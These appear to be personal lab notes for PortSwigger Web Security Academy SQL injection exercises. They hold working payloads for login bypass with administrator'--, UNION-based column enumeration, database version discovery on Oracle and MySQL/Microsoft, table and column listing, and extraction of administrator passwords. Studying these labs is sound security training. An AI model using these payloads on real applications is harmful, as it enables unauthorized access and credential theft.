### sql injection

hint: internal server error on http route.  
 '+OR+1=1-- #will query all #SELECT \* FROM products WHERE catergory = '' or 1+1--' equivalent.
ex: https://0aa000d504428d79c0e803da00430076.web-security-academy.net/filter?category=%27+OR+1=1--

### SQL injection vulnerability allowing login bypass

Use burp suite to intercept and modify login.
modify username with parameter administrator'--

### SQL union injection

2 requirements:
How many columns are being returned from the original query?
Which columns returned from the original query are of a suitable data type to hold the results from the injected query?

Continue adding null values until the error disappears and the response includes additional content containing the null values.  
ex: /filter?category='+UNION+SELECT+NULL,NULL-- HTTP/1.1  
-NULL is a special keyword that matches any data type.
-add NULLs if 'internal server error'
ex: '+UNION+SELECT+NULL,NULL,NULL--

### Lab: SQL injection UNION attack, finding a column containing text

Use Burp Suite to intercept and modify the request that sets the product category filter.
Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the category parameter:
'+UNION+SELECT+NULL,NULL,NULL--
Try replacing each null with the random value provided by the lab, for example:
'+UNION+SELECT+'abcdef',NULL,NULL--
If an error occurs, move on to the next null and try that instead.

### SQL injection UNION attack, retrieving data from other tables

Find number of columns using NULL  
'+UNION+SELECT+NULL,NULL--  
Check columns for string values  
'+UNION+SELECT+'string','string2'--
Replace strings to search for username and password on table users
'+UNION+SELECT+username,+password+FROM+users--
right click - show response in browser, open new tab, paste.
get administrator password, and paste into login.

### SQL injection UNION attack, retrieving multiple values in a single column

intercept category, move to repeater  
in repeater find column size  
'+UNION+SELECT+NULL,'string'--  
locate string for username/password injection  
concat username and password into string starr is used to seperate values so you can find easily  
'+UNION+SELECT+NULL,username||'\*'||password+FROM+users--  
right click response show response in browser  
grab administrator password and login

### Lab: SQL injection attack, querying the database type and version on Oracle

Hint: There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual
ex: '+UNION+SELECT+NULL,NULL+FROM+dual--
check for string data types
'+UNION+SELECT+'string','string2'+FROM+dual--
Now look for version by using BANNER, NULL, and v$version from cheatsheet.
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--

### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

Hint: You can find some useful payloads on our SQL injection cheat sheet.
for this instead of using '--' at the end, it will be a hash #  
ex: '+UNION+SELECT+NULL#
find number of columns and check for strings
'+UNION+SELECT+'string2','string1'#
for microsoft @@version  
ex:'+UNION+SELECT+@@version,NULL#

### SQL injection attack, listing the database contents on non-Oracle databases

Hint: You can find some useful payloads on our SQL injection cheat sheet.  
proxy -> intercept -> repeater  
Non-oracle -- -> NULL NULL enumerate until columns found, then string search.  
Grab name of tables we want username/passwords table_name keyword information_schema.tables keyword  
ex: '+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--  
Show response in browser -> ctrl+f 'users' save user custom name
search column_name and information.schema.columns Where table_name= usercustomName
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_zleagd'--
find name of username column and password column -> ex: password_ozeovi username_oiwhns
Then make UNION select with username, password, FROM, usertable
ex: '+UNION+SELECT+username_oiwhns,password_ozeovi+FROM+users_zleagd--
grab username/password for administrator
Login from Myaccount

### SQL injection attack, listing the database contents on Oracle

proxy-intercept-repeater - ORACLE (+FROM+dual) instead of --
enumerate nulls for columns '+UNION+SELECT+NULL,NULL+FROM+dual--
test strings - both are strings
Grab name of tables we want username/passwords table_name keyword all_tables keyword for ORACLE
ex: '+UNION+SELECT+table_name,NULL+FROM+all_tables--
get users table info - USERS_ICXPNX
search column_name and ORACLE: all_tab_columns using our username table to filter via WHERE clause
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ICXPNX'--
Then make UNION select with username, password, FROM, usertable
PASSWORD_TYRFNT
USERNAME_AIPDKN
'+UNION+SELECT+USERNAME_AIPDKN,PASSWORD_TYRFNT+FROM+USERS_ICXPNX--
Log in using administrator and password.
